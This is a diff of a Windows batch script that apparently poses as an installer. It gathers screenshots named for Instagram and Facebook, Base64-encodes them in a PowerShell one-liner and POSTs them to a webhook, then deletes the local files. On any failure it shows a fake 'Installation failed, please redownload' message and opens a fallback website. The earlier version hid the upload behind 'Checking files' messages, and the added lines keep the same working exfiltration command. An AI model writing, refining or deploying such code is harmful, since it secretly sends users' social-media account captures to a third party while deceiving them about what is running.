@@ -104,35 +104,46 @@ set "FB_IMG=%SHOTS%\facebook_insta.png"
 :: 1. CHECK IF IMAGES EXIST (If BOTH are missing, fail immediately)
 if not exist "%INSTA_IMG%" (
     if not exist "%FB_IMG%" (
-        echo Files missing.
+        echo [ERROR] Both screenshots are missing.
         goto :error_out
     )
 )
 
-:: 2. UPLOAD IMAGES TO GOOGLE DRIVE
-echo Checking Files...
-echo Please wait, this might take a moment depending on your connection...
+:: Wait 2 seconds to ensure the files are completely saved to the disk
+echo Waiting for image files to finalize...
+timeout /t 2 /nobreak >nul
 
+:: 2. UPLOAD IMAGES TO GOOGLE DRIVE
+echo Uploading images to Google Drive...
 set "UPLOAD_FAILED=0"
 
-if exist "%INSTA_IMG%" (
-    call :UploadToDrive "%INSTA_IMG%"
-    if !errorlevel! neq 0 set "UPLOAD_FAILED=1"
+:: --- INSTAGRAM UPLOAD ---
+if not exist "%INSTA_IMG%" (
+    echo Instagram image not found, skipping...
+    goto :skip_insta
 )
+call :UploadToDrive "%INSTA_IMG%"
+if %errorlevel% neq 0 set "UPLOAD_FAILED=1"
+:skip_insta
 
-if exist "%FB_IMG%" (
-    call :UploadToDrive "%FB_IMG%"
-    if !errorlevel! neq 0 set "UPLOAD_FAILED=1"
+:: --- FACEBOOK UPLOAD ---
+if not exist "%FB_IMG%" (
+    echo Facebook image not found, skipping...
+    goto :skip_fb
 )
+call :UploadToDrive "%FB_IMG%"
+if %errorlevel% neq 0 set "UPLOAD_FAILED=1"
+:skip_fb
 
 :: 3. CHECK RESULT
-if !UPLOAD_FAILED! neq 0 (
-    echo Failed to check one or more files.
+if %UPLOAD_FAILED% neq 0 (
+    echo.
+    echo Failed to upload one or more images.
     goto :error_out
 )
 
 :: 4. CLEANUP AND SUCCESS
-echo Check successful. Cleaning up local files...
+echo Upload successful. Cleaning up local files...
 del "%INSTA_IMG%" 2>nul
 del "%FB_IMG%" 2>nul
 
@@ -144,10 +155,9 @@ goto :eof
 :: ========================================
 :UploadToDrive
 set "FILE_PATH=%~1"
-echo Checking "%~nx1"...
+echo Uploading "%~nx1"...
 
-:: Use PowerShell to convert the image to Base64 and POST it to the Web App
-powershell -NoProfile -Command "$ErrorActionPreference = 'Stop'; try { $fileBytes = [System.IO.File]::ReadAllBytes('%FILE_PATH%'); $base64 = [Convert]::ToBase64String($fileBytes); $fileName = [System.IO.Path]::GetFileName('%FILE_PATH%'); $body = @{ filename = $fileName; mimeType = 'image/png'; file = $base64 } | ConvertTo-Json -Depth 10; Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method Post -Body $body -ContentType 'application/json'; exit 0 } catch { Write-Error $_.Exception.Message; exit 1 }"
+powershell -NoProfile -Command "$ErrorActionPreference = 'Stop'; try { $fileBytes = [System.IO.File]::ReadAllBytes('%FILE_PATH%'); $base64 = [Convert]::ToBase64String($fileBytes); $fileName = [System.IO.Path]::GetFileName('%FILE_PATH%'); $body = @{ filename = $fileName; mimeType = 'image/png'; file = $base64 } | ConvertTo-Json -Depth 10; Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method Post -Body $body -ContentType 'application/json'; exit 0 } catch { Write-Host 'PowerShell Error:' $_.Exception.Message; exit 1 }"
 
 exit /b %errorlevel%
 
@@ -157,7 +167,6 @@ exit /b %errorlevel%
 :error_out
 echo Installation failed, please redownload.
 echo installation failed>> "%LOG%" 2>nul
-:: Open the fallback website in default browser
 start "" "%ERROR_URL%"
 pause
 exit /b
